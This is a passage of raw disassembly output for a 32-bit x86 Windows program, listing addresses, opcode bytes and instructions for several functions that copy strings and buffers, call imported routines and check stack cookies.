  403a24:	8d 51 01             	lea    0x1(%ecx),%edx
  403a27:	8a 01                	mov    (%ecx),%al
  403a29:	41                   	inc    %ecx
  403a2a:	84 c0                	test   %al,%al
  403a2c:	75 f9                	jne    0x403a27
  403a2e:	2b ca                	sub    %edx,%ecx
  403a30:	51                   	push   %ecx
  403a31:	57                   	push   %edi
  403a32:	68 10 ca 42 00       	push   $0x42ca10
  403a37:	e8 64 9e 00 00       	call   0x40d8a0
  403a3c:	83 c4 0c             	add    $0xc,%esp
  403a3f:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  403a46:	75 42                	jne    0x403a8a
  403a48:	68 00 10 00 00       	push   $0x1000
  403a4d:	68 10 ca 42 00       	push   $0x42ca10
  403a52:	68 40 2a 43 00       	push   $0x432a40
  403a57:	e8 d4 12 00 00       	call   0x404d30
  403a5c:	83 c4 0c             	add    $0xc,%esp
  403a5f:	85 c0                	test   %eax,%eax
  403a61:	75 13                	jne    0x403a76
  403a63:	68 cc 13 42 00       	push   $0x4213cc
  403a68:	e8 a3 df ff ff       	call   0x401a10
  403a6d:	83 c4 04             	add    $0x4,%esp
  403a70:	83 c8 ff             	or     $0xffffffff,%eax
  403a73:	5f                   	pop    %edi
  403a74:	5e                   	pop    %esi
  403a75:	c3                   	ret
  403a76:	ff 15 94 c9 42 00    	call   *0x42c994
  403a7c:	68 40 2a 43 00       	push   $0x432a40
  403a81:	ff 15 90 c9 42 00    	call   *0x42c990
  403a87:	83 c4 04             	add    $0x4,%esp
  403a8a:	56                   	push   %esi
  403a8b:	e8 70 fb ff ff       	call   0x403600
  403a90:	83 c4 04             	add    $0x4,%esp
  403a93:	ff 15 78 c9 42 00    	call   *0x42c978
  403a99:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  403aa0:	74 34                	je     0x403ad6
  403aa2:	68 00 10 00 00       	push   $0x1000
  403aa7:	68 10 ca 42 00       	push   $0x42ca10
  403aac:	68 20 ea 42 00       	push   $0x42ea20
  403ab1:	e8 5a 12 00 00       	call   0x404d10
  403ab6:	83 c4 0c             	add    $0xc,%esp
  403ab9:	85 c0                	test   %eax,%eax
  403abb:	75 0d                	jne    0x403aca
  403abd:	68 f4 13 42 00       	push   $0x4213f4
  403ac2:	e8 49 df ff ff       	call   0x401a10
  403ac7:	83 c4 04             	add    $0x4,%esp
  403aca:	68 20 ea 42 00       	push   $0x42ea20
  403acf:	e8 8c f6 ff ff       	call   0x403160
  403ad4:	eb 0b                	jmp    0x403ae1
  403ad6:	68 40 2a 43 00       	push   $0x432a40
  403adb:	ff 15 98 c9 42 00    	call   *0x42c998
  403ae1:	83 c4 04             	add    $0x4,%esp
  403ae4:	56                   	push   %esi
  403ae5:	e8 46 fd ff ff       	call   0x403830
  403aea:	83 c4 04             	add    $0x4,%esp
  403aed:	85 c0                	test   %eax,%eax
  403aef:	75 17                	jne    0x403b08
  403af1:	ff 15 d8 c9 42 00    	call   *0x42c9d8
  403af7:	85 c0                	test   %eax,%eax
  403af9:	74 13                	je     0x403b0e
  403afb:	68 34 14 42 00       	push   $0x421434
  403b00:	e8 0b df ff ff       	call   0x401a10
  403b05:	83 c4 04             	add    $0x4,%esp
  403b08:	5f                   	pop    %edi
  403b09:	83 c8 ff             	or     $0xffffffff,%eax
  403b0c:	5e                   	pop    %esi
  403b0d:	c3                   	ret
  403b0e:	5f                   	pop    %edi
  403b0f:	33 c0                	xor    %eax,%eax
  403b11:	5e                   	pop    %esi
  403b12:	c3                   	ret
  403b13:	cc                   	int3
  403b14:	cc                   	int3
  403b15:	cc                   	int3
  403b16:	cc                   	int3
  403b17:	cc                   	int3
  403b18:	cc                   	int3
  403b19:	cc                   	int3
  403b1a:	cc                   	int3
  403b1b:	cc                   	int3
  403b1c:	cc                   	int3
  403b1d:	cc                   	int3
  403b1e:	cc                   	int3
  403b1f:	cc                   	int3
  403b20:	b8 04 10 00 00       	mov    $0x1004,%eax
  403b25:	e8 56 3f 00 00       	call   0x407a80
  403b2a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  403b2f:	33 c4                	xor    %esp,%eax
  403b31:	89 84 24 00 10 00 00 	mov    %eax,0x1000(%esp)
  403b38:	8b 84 24 08 10 00 00 	mov    0x1008(%esp),%eax
  403b3f:	53                   	push   %ebx
  403b40:	56                   	push   %esi
  403b41:	8b b4 24 18 10 00 00 	mov    0x1018(%esp),%esi
  403b48:	57                   	push   %edi
  403b49:	8b bc 24 18 10 00 00 	mov    0x1018(%esp),%edi
  403b50:	68 10 02 42 00       	push   $0x420210
  403b55:	50                   	push   %eax
  403b56:	e8 05 ee ff ff       	call   0x402960
  403b5b:	56                   	push   %esi
  403b5c:	57                   	push   %edi
  403b5d:	8b d8                	mov    %eax,%ebx
  403b5f:	e8 dc 03 00 00       	call   0x403f40
  403b64:	83 c4 10             	add    $0x10,%esp
  403b67:	33 ff                	xor    %edi,%edi
  403b69:	8b f0                	mov    %eax,%esi
  403b6b:	85 db                	test   %ebx,%ebx
  403b6d:	0f 84 a9 00 00 00    	je     0x403c1c
  403b73:	53                   	push   %ebx
  403b74:	85 f6                	test   %esi,%esi
  403b76:	0f 84 a5 00 00 00    	je     0x403c21
  403b7c:	e8 db 61 00 00       	call   0x409d5c
  403b81:	83 c4 04             	add    $0x4,%esp
  403b84:	85 c0                	test   %eax,%eax
  403b86:	75 6b                	jne    0x403bf3
  403b88:	53                   	push   %ebx
  403b89:	6a 01                	push   $0x1
  403b8b:	8d 44 24 14          	lea    0x14(%esp),%eax
  403b8f:	68 00 10 00 00       	push   $0x1000
  403b94:	50                   	push   %eax
  403b95:	e8 e4 63 00 00       	call   0x409f7e
  403b9a:	83 c4 10             	add    $0x10,%esp
  403b9d:	83 f8 ff             	cmp    $0xffffffff,%eax
  403ba0:	75 10                	jne    0x403bb2
  403ba2:	53                   	push   %ebx
  403ba3:	e8 df 61 00 00       	call   0x409d87
  403ba8:	83 c4 04             	add    $0x4,%esp
  403bab:	85 c0                	test   %eax,%eax
  403bad:	74 29                	je     0x403bd8
  403baf:	53                   	push   %ebx
  403bb0:	eb 36                	jmp    0x403be8
  403bb2:	56                   	push   %esi
  403bb3:	6a 01                	push   $0x1
  403bb5:	8d 44 24 14          	lea    0x14(%esp),%eax
  403bb9:	68 00 10 00 00       	push   $0x1000
  403bbe:	50                   	push   %eax
  403bbf:	e8 5a 6f 00 00       	call   0x40ab1e
  403bc4:	83 c4 10             	add    $0x10,%esp
  403bc7:	85 c0                	test   %eax,%eax
  403bc9:	7e 1c                	jle    0x403be7
  403bcb:	56                   	push   %esi
  403bcc:	e8 b6 61 00 00       	call   0x409d87
  403bd1:	83 c4 04             	add    $0x4,%esp
  403bd4:	85 c0                	test   %eax,%eax
  403bd6:	75 0f                	jne    0x403be7
  403bd8:	53                   	push   %ebx
  403bd9:	e8 7e 61 00 00       	call   0x409d5c
  403bde:	83 c4 04             	add    $0x4,%esp
  403be1:	85 c0                	test   %eax,%eax
  403be3:	74 a3                	je     0x403b88
  403be5:	eb 0c                	jmp    0x403bf3
  403be7:	56                   	push   %esi
  403be8:	e8 70 bb 00 00       	call   0x40f75d
  403bed:	83 c4 04             	add    $0x4,%esp
  403bf0:	83 cf ff             	or     $0xffffffff,%edi
  403bf3:	53                   	push   %ebx
  403bf4:	e8 e3 60 00 00       	call   0x409cdc
  403bf9:	56                   	push   %esi
  403bfa:	e8 dd 60 00 00       	call   0x409cdc
  403bff:	83 c4 08             	add    $0x8,%esp
  403c02:	8b c7                	mov    %edi,%eax
  403c04:	5f                   	pop    %edi
  403c05:	5e                   	pop    %esi
  403c06:	5b                   	pop    %ebx
  403c07:	8b 8c 24 00 10 00 00 	mov    0x1000(%esp),%ecx
  403c0e:	33 cc                	xor    %esp,%ecx
  403c10:	e8 4f 3e 00 00       	call   0x407a64
  403c15:	81 c4 04 10 00 00    	add    $0x1004,%esp
  403c1b:	c3                   	ret
  403c1c:	85 f6                	test   %esi,%esi
  403c1e:	74 09                	je     0x403c29
  403c20:	56                   	push   %esi
  403c21:	e8 b6 60 00 00       	call   0x409cdc
  403c26:	83 c4 04             	add    $0x4,%esp
  403c29:	8b 8c 24 0c 10 00 00 	mov    0x100c(%esp),%ecx
  403c30:	83 c8 ff             	or     $0xffffffff,%eax
  403c33:	5f                   	pop    %edi
  403c34:	5e                   	pop    %esi
  403c35:	5b                   	pop    %ebx
  403c36:	33 cc                	xor    %esp,%ecx
  403c38:	e8 27 3e 00 00       	call   0x407a64
  403c3d:	81 c4 04 10 00 00    	add    $0x1004,%esp
  403c43:	c3                   	ret
  403c44:	cc                   	int3
  403c45:	cc                   	int3
  403c46:	cc                   	int3
  403c47:	cc                   	int3
  403c48:	cc                   	int3
  403c49:	cc                   	int3
  403c4a:	cc                   	int3
  403c4b:	cc                   	int3
  403c4c:	cc                   	int3
  403c4d:	cc                   	int3
  403c4e:	cc                   	int3
  403c4f:	cc                   	int3
  403c50:	56                   	push   %esi
  403c51:	8b 74 24 08          	mov    0x8(%esp),%esi
  403c55:	83 be 68 40 00 00 01 	cmpl   $0x1,0x4068(%esi)
  403c5c:	74 3b                	je     0x403c99
  403c5e:	68 88 15 42 00       	push   $0x421588
  403c63:	56                   	push   %esi
  403c64:	e8 47 d8 ff ff       	call   0x4014b0
  403c69:	50                   	push   %eax
  403c6a:	8d 86 68 20 00 00    	lea    0x2068(%esi),%eax
  403c70:	50                   	push   %eax
  403c71:	e8 2a 00 00 00       	call   0x403ca0
  403c76:	83 c4 10             	add    $0x10,%esp
  403c79:	85 c0                	test   %eax,%eax
  403c7b:	75 12                	jne    0x403c8f
  403c7d:	68 9c 15 42 00       	push   $0x42159c
  403c82:	e8 89 dd ff ff       	call   0x401a10
  403c87:	83 c4 04             	add    $0x4,%esp
  403c8a:	83 c8 ff             	or     $0xffffffff,%eax
  403c8d:	5e                   	pop    %esi
  403c8e:	c3                   	ret
  403c8f:	c7 86 68 40 00 00 01 	movl   $0x1,0x4068(%esi)
  403c96:	00 00 00 
  403c99:	33 c0                	xor    %eax,%eax
  403c9b:	5e                   	pop    %esi
  403c9c:	c3                   	ret
  403c9d:	cc                   	int3
  403c9e:	cc                   	int3
  403c9f:	cc                   	int3
  403ca0:	b8 2c 30 00 00       	mov    $0x302c,%eax
  403ca5:	e8 d6 3d 00 00       	call   0x407a80
  403caa:	a1 08 c0 42 00       	mov    0x42c008,%eax
  403caf:	33 c4                	xor    %esp,%eax
  403cb1:	89 84 24 28 30 00 00 	mov    %eax,0x3028(%esp)
  403cb8:	8b 84 24 30 30 00 00 	mov    0x3030(%esp),%eax
  403cbf:	53                   	push   %ebx
  403cc0:	55                   	push   %ebp
  403cc1:	8b ac 24 3c 30 00 00 	mov    0x303c(%esp),%ebp
  403cc8:	89 44 24 08          	mov    %eax,0x8(%esp)
  403ccc:	56                   	push   %esi
  403ccd:	57                   	push   %edi
  403cce:	85 ed                	test   %ebp,%ebp
  403cd0:	74 54                	je     0x403d26
  403cd2:	68 74 15 42 00       	push   $0x421574
  403cd7:	e8 b4 01 00 00       	call   0x403e90
  403cdc:	55                   	push   %ebp
  403cdd:	8b d8                	mov    %eax,%ebx
  403cdf:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  403ce3:	68 00 10 00 00       	push   $0x1000
  403ce8:	50                   	push   %eax
  403ce9:	e8 e2 ec ff ff       	call   0x4029d0
  403cee:	6a 00                	push   $0x0
  403cf0:	68 74 15 42 00       	push   $0x421574
  403cf5:	6a 00                	push   $0x0
  403cf7:	e8 34 10 00 00       	call   0x404d30
  403cfc:	8b f8                	mov    %eax,%edi
  403cfe:	8d 44 24 50          	lea    0x50(%esp),%eax
  403d02:	6a 00                	push   $0x0
  403d04:	50                   	push   %eax
  403d05:	6a 00                	push   $0x0
  403d07:	e8 24 10 00 00       	call   0x404d30
  403d0c:	8b f0                	mov    %eax,%esi
  403d0e:	56                   	push   %esi
  403d0f:	57                   	push   %edi
  403d10:	e8 00 a9 00 00       	call   0x40e615
  403d15:	57                   	push   %edi
  403d16:	e8 3b 5f 00 00       	call   0x409c56
  403d1b:	56                   	push   %esi
  403d1c:	e8 35 5f 00 00       	call   0x409c56
  403d21:	83 c4 38             	add    $0x38,%esp
  403d24:	eb 04                	jmp    0x403d2a
  403d26:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  403d2a:	8d 84 24 38 10 00 00 	lea    0x1038(%esp),%eax
  403d31:	50                   	push   %eax
  403d32:	68 00 10 00 00       	push   $0x1000
  403d37:	ff 15 28 00 42 00    	call   *0x420028
  403d3d:	e8 a2 92 00 00       	call   0x40cfe4
  403d42:	50                   	push   %eax
  403d43:	68 78 15 42 00       	push   $0x421578
  403d48:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403d4c:	6a 10                	push   $0x10
  403d4e:	50                   	push   %eax
  403d4f:	e8 0c 0a 00 00       	call   0x404760
  403d54:	83 c4 10             	add    $0x10,%esp
  403d57:	33 f6                	xor    %esi,%esi
  403d59:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403d60:	8d 44 24 14          	lea    0x14(%esp),%eax
  403d64:	50                   	push   %eax
  403d65:	8d 84 24 3c 10 00 00 	lea    0x103c(%esp),%eax
  403d6c:	50                   	push   %eax
  403d6d:	e8 d0 b9 00 00       	call   0x40f742
  403d72:	8b f8                	mov    %eax,%edi
  403d74:	57                   	push   %edi
  403d75:	e8 26 0e 00 00       	call   0x404ba0
  403d7a:	83 c4 0c             	add    $0xc,%esp
  403d7d:	85 c0                	test   %eax,%eax
  403d7f:	74 71                	je     0x403df2
  403d81:	57                   	push   %edi
  403d82:	e8 cf 5e 00 00       	call   0x409c56
  403d87:	46                   	inc    %esi
  403d88:	83 c4 04             	add    $0x4,%esp
  403d8b:	83 fe 05             	cmp    $0x5,%esi
  403d8e:	7c d0                	jl     0x403d60
  403d90:	85 ed                	test   %ebp,%ebp
  403d92:	74 5a                	je     0x403dee
  403d94:	6a 00                	push   $0x0
  403d96:	68 74 15 42 00       	push   $0x421574
  403d9b:	6a 00                	push   $0x0
  403d9d:	e8 8e 0f 00 00       	call   0x404d30
  403da2:	85 db                	test   %ebx,%ebx
  403da4:	74 31                	je     0x403dd7
  403da6:	6a 00                	push   $0x0
  403da8:	53                   	push   %ebx
  403da9:	6a 00                	push   $0x0
  403dab:	8b f8                	mov    %eax,%edi
  403dad:	e8 7e 0f 00 00       	call   0x404d30
  403db2:	8b f0                	mov    %eax,%esi
  403db4:	56                   	push   %esi
  403db5:	57                   	push   %edi
  403db6:	e8 5a a8 00 00       	call   0x40e615
  403dbb:	57                   	push   %edi
  403dbc:	e8 95 5e 00 00       	call   0x409c56
  403dc1:	56                   	push   %esi
  403dc2:	e8 8f 5e 00 00       	call   0x409c56
  403dc7:	53                   	push   %ebx
  403dc8:	e8 89 5e 00 00       	call   0x409c56
  403dcd:	83 c4 2c             	add    $0x2c,%esp
  403dd0:	33 c0                	xor    %eax,%eax
  403dd2:	e9 91 00 00 00       	jmp    0x403e68
  403dd7:	83 c4 0c             	add    $0xc,%esp
  403dda:	8b f0                	mov    %eax,%esi
  403ddc:	6a 00                	push   $0x0
  403dde:	56                   	push   %esi
  403ddf:	ff 15 20 00 42 00    	call   *0x420020
  403de5:	56                   	push   %esi
  403de6:	e8 6b 5e 00 00       	call   0x409c56
  403deb:	83 c4 04             	add    $0x4,%esp
  403dee:	33 c0                	xor    %eax,%eax
  403df0:	eb 76                	jmp    0x403e68
  403df2:	68 00 10 00 00       	push   $0x1000
  403df7:	57                   	push   %edi
  403df8:	ff 74 24 18          	push   0x18(%esp)
  403dfc:	e8 bf 0f 00 00       	call   0x404dc0
  403e01:	57                   	push   %edi
  403e02:	e8 4f 5e 00 00       	call   0x409c56
  403e07:	83 c4 10             	add    $0x10,%esp
  403e0a:	85 ed                	test   %ebp,%ebp
  403e0c:	74 55                	je     0x403e63
  403e0e:	6a 00                	push   $0x0
  403e10:	68 74 15 42 00       	push   $0x421574
  403e15:	6a 00                	push   $0x0
  403e17:	e8 14 0f 00 00       	call   0x404d30
  403e1c:	85 db                	test   %ebx,%ebx
  403e1e:	74 2c                	je     0x403e4c
  403e20:	6a 00                	push   $0x0
  403e22:	53                   	push   %ebx
  403e23:	6a 00                	push   $0x0
  403e25:	8b f8                	mov    %eax,%edi
  403e27:	e8 04 0f 00 00       	call   0x404d30
  403e2c:	8b f0                	mov    %eax,%esi
  403e2e:	56                   	push   %esi
  403e2f:	57                   	push   %edi
  403e30:	e8 e0 a7 00 00       	call   0x40e615
  403e35:	57                   	push   %edi
  403e36:	e8 1b 5e 00 00       	call   0x409c56
  403e3b:	56                   	push   %esi
  403e3c:	e8 15 5e 00 00       	call   0x409c56
  403e41:	53                   	push   %ebx
  403e42:	e8 0f 5e 00 00       	call   0x409c56
  403e47:	83 c4 2c             	add    $0x2c,%esp
  403e4a:	eb 17                	jmp    0x403e63
  403e4c:	83 c4 0c             	add    $0xc,%esp
  403e4f:	8b f0                	mov    %eax,%esi
  403e51:	6a 00                	push   $0x0
  403e53:	56                   	push   %esi
  403e54:	ff 15 20 00 42 00    	call   *0x420020
  403e5a:	56                   	push   %esi
  403e5b:	e8 f6 5d 00 00       	call   0x409c56
  403e60:	83 c4 04             	add    $0x4,%esp
  403e63:	b8 01 00 00 00       	mov    $0x1,%eax
  403e68:	8b 8c 24 38 30 00 00 	mov    0x3038(%esp),%ecx
  403e6f:	5f                   	pop    %edi
  403e70:	5e                   	pop    %esi
  403e71:	5d                   	pop    %ebp
  403e72:	5b                   	pop    %ebx
  403e73:	33 cc                	xor    %esp,%ecx
  403e75:	e8 ea 3b 00 00       	call   0x407a64
  403e7a:	81 c4 2c 30 00 00    	add    $0x302c,%esp
  403e80:	c3                   	ret
  403e81:	cc                   	int3
  403e82:	cc                   	int3
  403e83:	cc                   	int3
  403e84:	cc                   	int3
  403e85:	cc                   	int3
  403e86:	cc                   	int3
  403e87:	cc                   	int3
  403e88:	cc                   	int3
  403e89:	cc                   	int3
  403e8a:	cc                   	int3
  403e8b:	cc                   	int3
  403e8c:	cc                   	int3
  403e8d:	cc                   	int3
  403e8e:	cc                   	int3
  403e8f:	cc                   	int3
  403e90:	b8 04 40 00 00       	mov    $0x4004,%eax
  403e95:	e8 e6 3b 00 00       	call   0x407a80
  403e9a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  403e9f:	33 c4                	xor    %esp,%eax
  403ea1:	89 84 24 00 40 00 00 	mov    %eax,0x4000(%esp)
  403ea8:	8b 84 24 08 40 00 00 	mov    0x4008(%esp),%eax
  403eaf:	6a 00                	push   $0x0
  403eb1:	50                   	push   %eax
  403eb2:	6a 00                	push   $0x0
  403eb4:	e8 77 0e 00 00       	call   0x404d30
  403eb9:	83 c4 0c             	add    $0xc,%esp
  403ebc:	8d 0c 24             	lea    (%esp),%ecx
  403ebf:	68 00 20 00 00       	push   $0x2000
  403ec4:	51                   	push   %ecx
  403ec5:	50                   	push   %eax
  403ec6:	ff 15 1c 00 42 00    	call   *0x42001c
  403ecc:	85 c0                	test   %eax,%eax
  403ece:	74 50                	je     0x403f20
  403ed0:	68 00 20 00 00       	push   $0x2000
  403ed5:	8d 84 24 04 20 00 00 	lea    0x2004(%esp),%eax
  403edc:	50                   	push   %eax
  403edd:	8d 44 24 08          	lea    0x8(%esp),%eax
  403ee1:	50                   	push   %eax
  403ee2:	ff 15 24 00 42 00    	call   *0x420024
  403ee8:	6a 00                	push   $0x0
  403eea:	8d 44 24 04          	lea    0x4(%esp),%eax
  403eee:	50                   	push   %eax
  403eef:	6a 00                	push   $0x0
  403ef1:	e8 ca 0e 00 00       	call   0x404dc0
  403ef6:	83 c4 0c             	add    $0xc,%esp
  403ef9:	85 c0                	test   %eax,%eax
  403efb:	74 23                	je     0x403f20
  403efd:	80 38 00             	cmpb   $0x0,(%eax)
  403f00:	74 1e                	je     0x403f20
  403f02:	50                   	push   %eax
  403f03:	e8 fc 9d 00 00       	call   0x40dd04
  403f08:	83 c4 04             	add    $0x4,%esp
  403f0b:	8b 8c 24 00 40 00 00 	mov    0x4000(%esp),%ecx
  403f12:	33 cc                	xor    %esp,%ecx
  403f14:	e8 4b 3b 00 00       	call   0x407a64
  403f19:	81 c4 04 40 00 00    	add    $0x4004,%esp
  403f1f:	c3                   	ret
  403f20:	8b 8c 24 00 40 00 00 	mov    0x4000(%esp),%ecx
  403f27:	33 c0                	xor    %eax,%eax
  403f29:	33 cc                	xor    %esp,%ecx
  403f2b:	e8 34 3b 00 00       	call   0x407a64
  403f30:	81 c4 04 40 00 00    	add    $0x4004,%esp
  403f36:	c3                   	ret
  403f37:	cc                   	int3
  403f38:	cc                   	int3
  403f39:	cc                   	int3
  403f3a:	cc                   	int3
  403f3b:	cc                   	int3
  403f3c:	cc                   	int3
  403f3d:	cc                   	int3
  403f3e:	cc                   	int3
  403f3f:	cc                   	int3
  403f40:	b8 34 40 00 00       	mov    $0x4034,%eax
  403f45:	e8 36 3b 00 00       	call   0x407a80
  403f4a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  403f4f:	33 c4                	xor    %esp,%eax
  403f51:	89 84 24 30 40 00 00 	mov    %eax,0x4030(%esp)
  403f58:	8b 84 24 38 40 00 00 	mov    0x4038(%esp),%eax
  403f5f:	56                   	push   %esi
  403f60:	8b b4 24 40 40 00 00 	mov    0x4040(%esp),%esi
  403f67:	68 00 10 00 00       	push   $0x1000
  403f6c:	50                   	push   %eax
  403f6d:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  403f71:	50                   	push   %eax
  403f72:	e8 49 8f 00 00       	call   0x40cec0
  403f77:	68 00 10 00 00       	push   $0x1000
  403f7c:	8d 84 24 44 10 00 00 	lea    0x1044(%esp),%eax
  403f83:	56                   	push   %esi
  403f84:	50                   	push   %eax
  403f85:	e8 36 8f 00 00       	call   0x40cec0
  403f8a:	83 c4 18             	add    $0x18,%esp
  403f8d:	80 bc 24 33 10 00 00 	cmpb   $0x0,0x1033(%esp)
  403f94:	00 
  403f95:	0f 85 6f 01 00 00    	jne    0x40410a
  403f9b:	80 bc 24 33 20 00 00 	cmpb   $0x0,0x2033(%esp)
  403fa2:	00 
  403fa3:	0f 85 61 01 00 00    	jne    0x40410a
  403fa9:	55                   	push   %ebp
  403faa:	8d 6c 24 38          	lea    0x38(%esp),%ebp
  403fae:	8d 4d 01             	lea    0x1(%ebp),%ecx
  403fb1:	8a 45 00             	mov    0x0(%ebp),%al
  403fb4:	45                   	inc    %ebp
  403fb5:	84 c0                	test   %al,%al
  403fb7:	75 f8                	jne    0x403fb1
  403fb9:	53                   	push   %ebx
  403fba:	57                   	push   %edi
  403fbb:	8d 84 24 40 10 00 00 	lea    0x1040(%esp),%eax
  403fc2:	2b e9                	sub    %ecx,%ebp
  403fc4:	68 3c 04 42 00       	push   $0x42043c
  403fc9:	50                   	push   %eax
  403fca:	e8 1b 90 00 00       	call   0x40cfea
  403fcf:	8b d8                	mov    %eax,%ebx
  403fd1:	83 c4 08             	add    $0x8,%esp
  403fd4:	85 db                	test   %ebx,%ebx
  403fd6:	0f 84 d8 00 00 00    	je     0x4040b4
  403fdc:	0f 1f 40 00          	nopl   0x0(%eax)
  403fe0:	8b cb                	mov    %ebx,%ecx
  403fe2:	8d 51 01             	lea    0x1(%ecx),%edx
  403fe5:	8a 01                	mov    (%ecx),%al
  403fe7:	41                   	inc    %ecx
  403fe8:	84 c0                	test   %al,%al
  403fea:	75 f9                	jne    0x403fe5
  403fec:	2b ca                	sub    %edx,%ecx
  403fee:	45                   	inc    %ebp
  403fef:	03 e9                	add    %ecx,%ebp
  403ff1:	81 fd ff 0f 00 00    	cmp    $0xfff,%ebp
  403ff7:	0f 83 9c 00 00 00    	jae    0x404099
  403ffd:	8d 7c 24 40          	lea    0x40(%esp),%edi
  404001:	4f                   	dec    %edi
  404002:	8a 47 01             	mov    0x1(%edi),%al
  404005:	8d 7f 01             	lea    0x1(%edi),%edi
  404008:	84 c0                	test   %al,%al
  40400a:	75 f6                	jne    0x404002
  40400c:	66 a1 3c 04 42 00    	mov    0x42043c,%ax
  404012:	8b f3                	mov    %ebx,%esi
  404014:	66 89 07             	mov    %ax,(%edi)
  404017:	8a 03                	mov    (%ebx),%al
  404019:	43                   	inc    %ebx
  40401a:	84 c0                	test   %al,%al
  40401c:	75 f9                	jne    0x404017
  40401e:	8d 7c 24 40          	lea    0x40(%esp),%edi
  404022:	2b de                	sub    %esi,%ebx
  404024:	4f                   	dec    %edi
  404025:	8a 47 01             	mov    0x1(%edi),%al
  404028:	47                   	inc    %edi
  404029:	84 c0                	test   %al,%al
  40402b:	75 f8                	jne    0x404025
  40402d:	8b cb                	mov    %ebx,%ecx
  40402f:	c1 e9 02             	shr    $0x2,%ecx
  404032:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404034:	8b cb                	mov    %ebx,%ecx
  404036:	83 e1 03             	and    $0x3,%ecx
  404039:	68 3c 04 42 00       	push   $0x42043c
  40403e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404040:	6a 00                	push   $0x0
  404042:	e8 a3 8f 00 00       	call   0x40cfea
  404047:	8b d8                	mov    %eax,%ebx
  404049:	83 c4 08             	add    $0x8,%esp
  40404c:	85 db                	test   %ebx,%ebx
  40404e:	74 64                	je     0x4040b4
  404050:	68 00 10 00 00       	push   $0x1000
  404055:	8d 44 24 44          	lea    0x44(%esp),%eax
  404059:	50                   	push   %eax
  40405a:	8d 84 24 48 20 00 00 	lea    0x2048(%esp),%eax
  404061:	50                   	push   %eax
  404062:	e8 c9 0c 00 00       	call   0x404d30
  404067:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  40406b:	50                   	push   %eax
  40406c:	8d 84 24 50 20 00 00 	lea    0x2050(%esp),%eax
  404073:	50                   	push   %eax
  404074:	e8 da 97 00 00       	call   0x40d853
  404079:	83 c4 14             	add    $0x14,%esp
  40407c:	85 c0                	test   %eax,%eax
  40407e:	0f 89 5c ff ff ff    	jns    0x403fe0
  404084:	8d 84 24 40 20 00 00 	lea    0x2040(%esp),%eax
  40408b:	50                   	push   %eax
  40408c:	e8 0f 0b 00 00       	call   0x404ba0
  404091:	83 c4 04             	add    $0x4,%esp
  404094:	e9 47 ff ff ff       	jmp    0x403fe0
  404099:	33 c0                	xor    %eax,%eax
  40409b:	5f                   	pop    %edi
  40409c:	5b                   	pop    %ebx
  40409d:	5d                   	pop    %ebp
  40409e:	5e                   	pop    %esi
  40409f:	8b 8c 24 30 40 00 00 	mov    0x4030(%esp),%ecx
  4040a6:	33 cc                	xor    %esp,%ecx
  4040a8:	e8 b7 39 00 00       	call   0x407a64
  4040ad:	81 c4 34 40 00 00    	add    $0x4034,%esp
  4040b3:	c3                   	ret
  4040b4:	68 00 10 00 00       	push   $0x1000
  4040b9:	8d 44 24 44          	lea    0x44(%esp),%eax
  4040bd:	50                   	push   %eax
  4040be:	8d 84 24 48 20 00 00 	lea    0x2048(%esp),%eax
  4040c5:	50                   	push   %eax
  4040c6:	e8 65 0c 00 00       	call   0x404d30
  4040cb:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4040cf:	50                   	push   %eax
  4040d0:	8d 84 24 50 20 00 00 	lea    0x2050(%esp),%eax
  4040d7:	50                   	push   %eax
  4040d8:	e8 76 97 00 00       	call   0x40d853
  4040dd:	83 c4 14             	add    $0x14,%esp
  4040e0:	85 c0                	test   %eax,%eax
  4040e2:	75 12                	jne    0x4040f6
  4040e4:	8d 44 24 40          	lea    0x40(%esp),%eax
  4040e8:	50                   	push   %eax
  4040e9:	68 e4 15 42 00       	push   $0x4215e4
  4040ee:	e8 8d d9 ff ff       	call   0x401a80
  4040f3:	83 c4 08             	add    $0x8,%esp
  4040f6:	8d 44 24 40          	lea    0x40(%esp),%eax
  4040fa:	68 18 16 42 00       	push   $0x421618
  4040ff:	50                   	push   %eax
  404100:	e8 5b e8 ff ff       	call   0x402960
  404105:	83 c4 08             	add    $0x8,%esp
  404108:	eb 91                	jmp    0x40409b
  40410a:	8b 8c 24 34 40 00 00 	mov    0x4034(%esp),%ecx
  404111:	33 c0                	xor    %eax,%eax
  404113:	5e                   	pop    %esi
  404114:	33 cc                	xor    %esp,%ecx
  404116:	e8 49 39 00 00       	call   0x407a64
  40411b:	81 c4 34 40 00 00    	add    $0x4034,%esp
  404121:	c3                   	ret
  404122:	cc                   	int3
  404123:	cc                   	int3
  404124:	cc                   	int3
  404125:	cc                   	int3
  404126:	cc                   	int3
  404127:	cc                   	int3
  404128:	cc                   	int3
  404129:	cc                   	int3
  40412a:	cc                   	int3
  40412b:	cc                   	int3
  40412c:	cc                   	int3
  40412d:	cc                   	int3
  40412e:	cc                   	int3
  40412f:	cc                   	int3
  404130:	55                   	push   %ebp
  404131:	8b ec                	mov    %esp,%ebp
  404133:	83 e4 f8             	and    $0xfffffff8,%esp
  404136:	b8 84 54 00 00       	mov    $0x5484,%eax
  40413b:	e8 40 39 00 00       	call   0x407a80
  404140:	a1 08 c0 42 00       	mov    0x42c008,%eax
  404145:	33 c4                	xor    %esp,%eax
  404147:	89 84 24 80 54 00 00 	mov    %eax,0x5480(%esp)
  40414e:	8b 45 08             	mov    0x8(%ebp),%eax
  404151:	53                   	push   %ebx
  404152:	56                   	push   %esi
  404153:	57                   	push   %edi
  404154:	68 00 10 00 00       	push   $0x1000
  404159:	50                   	push   %eax
  40415a:	8d 84 24 88 34 00 00 	lea    0x3488(%esp),%eax
  404161:	50                   	push   %eax
  404162:	e8 c9 0b 00 00       	call   0x404d30
  404167:	83 c4 0c             	add    $0xc,%esp
  40416a:	33 c9                	xor    %ecx,%ecx
  40416c:	0f 1f 40 00          	nopl   0x0(%eax)
